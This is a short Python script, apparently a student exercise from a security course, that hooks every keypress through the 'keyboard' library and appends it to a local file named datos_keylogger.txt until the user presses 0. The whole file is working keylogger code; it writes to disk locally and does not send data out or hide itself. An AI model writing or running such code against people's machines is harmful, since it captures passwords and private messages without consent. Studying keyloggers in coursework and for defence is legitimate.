import keyboard

def onKeyboardEvent(event):
    with open("C:\\Users\\laura\\Desktop\\SI_T5_P1\\datos_keylogger.txt", "a") as file:
        if event.name == "space":
            file.write(" ")
        else:
            file.write(str(event.name))

keyboard.on_press(onKeyboardEvent)
print("Pulsa 0 para salir")
keyboard.wait("0")